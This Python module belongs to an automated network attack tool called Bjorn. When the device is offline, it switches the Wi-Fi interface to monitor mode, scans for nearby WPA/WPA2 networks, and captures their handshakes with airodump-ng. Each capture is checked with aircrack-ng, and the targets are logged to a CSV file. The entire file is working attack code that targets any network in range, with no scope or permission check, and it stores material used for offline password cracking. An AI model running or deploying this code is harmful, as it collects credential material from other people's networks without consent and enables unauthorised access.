"""
wifi_handshake_capture.py - This script captures WPA/WPA2 handshakes from nearby WiFi networks
when Bjorn is not connected to any WiFi network. It uses aircrack-ng tools to scan networks,
put the interface in monitor mode, and capture handshakes.
"""

import os
import subprocess
import time
import logging
import csv
import re
from datetime import datetime
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="wifi_handshake_capture.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "WifiHandshakeCapture"
b_module = "wifi_handshake_capture"
b_status = "wifi_handshake_capture"
b_port = 0  # Standalone action
b_parent = None

class WifiHandshakeCapture:
    """
    Class to handle WiFi handshake capture when not connected to any network.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.handshakes_dir = os.path.join(shared_data.output_dir, 'handshakes')
        self.metadata_file = os.path.join(self.handshakes_dir, 'handshakes_metadata.csv')
        self.wifi_interface = getattr(shared_data, 'wifi_interface', 'wlan0')
        self.monitor_interface = None
        
        # Create handshakes directory if it doesn't exist
        if not os.path.exists(self.handshakes_dir):
            os.makedirs(self.handshakes_dir)
            logger.info(f"Created handshakes directory: {self.handshakes_dir}")
        
        # Initialize metadata CSV file if it doesn't exist
        if not os.path.exists(self.metadata_file):
            with open(self.metadata_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['SSID', 'BSSID', 'Channel', 'Encryption', 'Date', 'Filename', 'Status'])
        
        logger.info("WifiHandshakeCapture initialized")

    def is_wifi_connected(self):
        """Check if WiFi is currently connected."""
        try:
            result = subprocess.Popen(['nmcli', '-t', '-f', 'active', 'dev', 'wifi'], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            return 'yes' in output
        except Exception as e:
            logger.error(f"Error checking WiFi connection: {e}")
            return False

    def check_interface_exists(self, interface):
        """Check if the WiFi interface exists."""
        try:
            result = subprocess.Popen(['ip', 'link', 'show', interface], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            return result.returncode == 0
        except Exception as e:
            logger.error(f"Error checking interface {interface}: {e}")
            return False

    def kill_existing_processes(self):
        """Kill any existing airodump-ng or aireplay-ng processes."""
        try:
            subprocess.Popen(['sudo', 'killall', 'airodump-ng'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.Popen(['sudo', 'killall', 'aireplay-ng'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
        except Exception as e:
            logger.warning(f"Error killing existing processes: {e}")

    def set_monitor_mode(self, interface):
        """Put the WiFi interface in monitor mode."""
        try:
            # First, bring down the interface
            subprocess.Popen(['sudo', 'ifconfig', interface, 'down'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            time.sleep(1)
            
            # Set monitor mode
            result = subprocess.Popen(['sudo', 'iwconfig', interface, 'mode', 'monitor'], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            
            if result.returncode != 0:
                # Try alternative method with iw
                result = subprocess.Popen(['sudo', 'iw', interface, 'set', 'type', 'monitor'], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output, error = result.communicate()
            
            if result.returncode == 0:
                # Bring up the interface
                subprocess.Popen(['sudo', 'ifconfig', interface, 'up'], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                time.sleep(1)
                self.monitor_interface = interface
                logger.info(f"Interface {interface} set to monitor mode")
                return True
            else:
                logger.error(f"Failed to set monitor mode: {error}")
                return False
        except Exception as e:
            logger.error(f"Error setting monitor mode: {e}")
            return False

    def restore_managed_mode(self, interface):
        """Restore the WiFi interface to managed mode."""
        try:
            # Bring down the interface
            subprocess.Popen(['sudo', 'ifconfig', interface, 'down'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            time.sleep(1)
            
            # Set managed mode
            result = subprocess.Popen(['sudo', 'iwconfig', interface, 'mode', 'managed'], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            
            if result.returncode != 0:
                # Try alternative method with iw
                result = subprocess.Popen(['sudo', 'iw', interface, 'set', 'type', 'managed'], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output, error = result.communicate()
            
            if result.returncode == 0:
                # Bring up the interface
                subprocess.Popen(['sudo', 'ifconfig', interface, 'up'], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                time.sleep(1)
                logger.info(f"Interface {interface} restored to managed mode")
                return True
            else:
                logger.error(f"Failed to restore managed mode: {error}")
                return False
        except Exception as e:
            logger.error(f"Error restoring managed mode: {e}")
            return False

    def scan_networks(self, interface, duration=10):
        """Scan for nearby WiFi networks."""
        try:
            networks = []
            # Use airodump-ng to scan networks
            output_file = os.path.join(self.handshakes_dir, f'scan_{int(time.time())}.csv')
            cmd = ['sudo', 'airodump-ng', '--write', output_file.replace('.csv', ''), 
                   '--output-format', 'csv', '--write-interval', '1', interface]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Wait for the specified duration
            time.sleep(duration)
            
            # Terminate the process
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            # Parse the CSV file
            csv_file = output_file.replace('.csv', '-01.csv')
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    reader = csv.reader(f)
                    for row in reader:
                        if len(row) >= 14 and row[0].strip() and not row[0].startswith('BSSID'):
                            bssid = row[0].strip()
                            # Skip if it's the header row
                            if bssid == 'BSSID':
                                continue
                            try:
                                ssid = row[13].strip() if len(row) > 13 else 'Hidden'
                                channel = row[3].strip() if len(row) > 3 else '0'
                                encryption = row[5].strip() if len(row) > 5 else 'Unknown'
                                
                                if ssid and bssid and encryption.upper() in ['WPA', 'WPA2', 'WPA2 WPA']:
                                    networks.append({
                                        'BSSID': bssid,
                                        'SSID': ssid,
                                        'Channel': channel,
                                        'Encryption': encryption
                                    })
                            except (IndexError, ValueError) as e:
                                logger.warning(f"Error parsing network row: {e}")
                                continue
                
                # Clean up scan file
                try:
                    os.remove(csv_file)
                except:
                    pass
            
            logger.info(f"Found {len(networks)} WPA/WPA2 networks")
            return networks
        except Exception as e:
            logger.error(f"Error scanning networks: {e}")
            return []

    def capture_handshake(self, interface, bssid, channel, ssid, duration=60):
        """Capture handshake for a specific network."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"handshake_{ssid.replace(' ', '_').replace('/', '_')}_{timestamp}"
            output_path = os.path.join(self.handshakes_dir, filename)
            
            logger.info(f"Capturing handshake for {ssid} (BSSID: {bssid}, Channel: {channel})")
            
            # Start airodump-ng to capture handshake
            cmd = ['sudo', 'airodump-ng', '-c', str(channel), '--bssid', bssid, 
                   '--write', output_path, '--output-format', 'cap', interface]
            
            airodump_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                              stderr=subprocess.PIPE, text=True)
            
            # Wait for the specified duration
            start_time = time.time()
            while time.time() - start_time < duration:
                if self.shared_data.orchestrator_should_exit:
                    airodump_process.terminate()
                    return False
                time.sleep(5)
                
                # Check if handshake was captured
                cap_file = f"{output_path}-01.cap"
                if os.path.exists(cap_file):
                    # Check if handshake is valid using aircrack-ng
                    if self.verify_handshake(cap_file, bssid):
                        logger.success(f"Handshake captured for {ssid}!")
                        airodump_process.terminate()
                        return True
            
            # Terminate airodump
            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()
            
            # Check one more time if handshake was captured
            cap_file = f"{output_path}-01.cap"
            if os.path.exists(cap_file):
                if self.verify_handshake(cap_file, bssid):
                    logger.success(f"Handshake captured for {ssid}!")
                    return True
                else:
                    # Remove invalid capture file
                    try:
                        os.remove(cap_file)
                    except:
                        pass
            
            logger.warning(f"Handshake not captured for {ssid} within {duration} seconds")
            return False
        except Exception as e:
            logger.error(f"Error capturing handshake: {e}")
            return False

    def verify_handshake(self, cap_file, bssid):
        """Verify if a captured file contains a valid handshake."""
        try:
            # Use aircrack-ng to verify handshake
            cmd = ['sudo', 'aircrack-ng', cap_file]
            result = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, text=True)
            output, error = result.communicate()
            
            # Check if handshake is present in output
            if '1 handshake' in output or 'WPA (1 handshake)' in output:
                return True
            return False
        except Exception as e:
            logger.warning(f"Error verifying handshake: {e}")
            return False

    def save_handshake_metadata(self, ssid, bssid, channel, encryption, filename, status):
        """Save handshake metadata to CSV file."""
        try:
            with open(self.metadata_file, 'a', newline='') as f:
                writer = csv.writer(f)
                date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                writer.writerow([ssid, bssid, channel, encryption, date, filename, status])
        except Exception as e:
            logger.error(f"Error saving metadata: {e}")

    def execute(self):
        """
        Execute the WiFi handshake capture process.
        This is a standalone action that runs when no WiFi is connected.
        """
        try:
            # Check if WiFi handshake capture is enabled
            if not getattr(self.shared_data, 'wifi_handshake_enabled', True):
                logger.info("WiFi handshake capture is disabled")
                return 'failed'
            
            # Check if WiFi is connected (should not be for this action)
            if self.is_wifi_connected():
                logger.info("WiFi is connected, skipping handshake capture")
                return 'failed'
            
            # Check if interface exists
            if not self.check_interface_exists(self.wifi_interface):
                logger.error(f"WiFi interface {self.wifi_interface} does not exist")
                return 'failed'
            
            logger.info("Starting WiFi handshake capture process...")
            self.shared_data.bjornorch_status = "WifiHandshakeCapture"
            self.shared_data.bjornstatustext2 = "Scanning networks..."
            
            # Kill any existing processes
            self.kill_existing_processes()
            
            # Set monitor mode
            if not self.set_monitor_mode(self.wifi_interface):
                logger.error("Failed to set monitor mode")
                return 'failed'
            
            try:
                # Scan for networks
                scan_duration = getattr(self.shared_data, 'wifi_handshake_scan_duration', 10)
                networks = self.scan_networks(self.wifi_interface, duration=scan_duration)
                
                if not networks:
                    logger.warning("No WPA/WPA2 networks found")
                    return 'failed'
                
                # Capture handshakes for found networks
                capture_duration = getattr(self.shared_data, 'wifi_handshake_duration', 60)
                handshakes_captured = 0
                
                for network in networks[:5]:  # Limit to 5 networks to avoid long execution
                    if self.shared_data.orchestrator_should_exit:
                        break
                    
                    self.shared_data.bjornstatustext2 = f"Capturing: {network['SSID']}"
                    
                    # Capture handshake
                    if self.capture_handshake(self.wifi_interface, network['BSSID'], 
                                             network['Channel'], network['SSID'], 
                                             duration=capture_duration):
                        handshakes_captured += 1
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"handshake_{network['SSID'].replace(' ', '_').replace('/', '_')}_{timestamp}-01.cap"
                        self.save_handshake_metadata(network['SSID'], network['BSSID'], 
                                                    network['Channel'], network['Encryption'],
                                                    filename, 'Captured')
                
                if handshakes_captured > 0:
                    logger.success(f"Successfully captured {handshakes_captured} handshake(s)")
                    return 'success'
                else:
                    logger.warning("No handshakes were captured")
                    return 'failed'
            
            finally:
                # Always restore managed mode
                self.restore_managed_mode(self.wifi_interface)
                self.kill_existing_processes()
                self.shared_data.bjornstatustext2 = ""
        
        except Exception as e:
            logger.error(f"Error in WiFi handshake capture: {e}")
            # Try to restore managed mode on error
            try:
                self.restore_managed_mode(self.wifi_interface)
                self.kill_existing_processes()
            except:
                pass
            return 'failed'

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        handshake_capture = WifiHandshakeCapture(shared_data)
        logger.info("Starting WiFi handshake capture...")
        result = handshake_capture.execute()
        logger.info(f"Handshake capture completed with result: {result}")
        exit(0 if result == 'success' else 1)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)

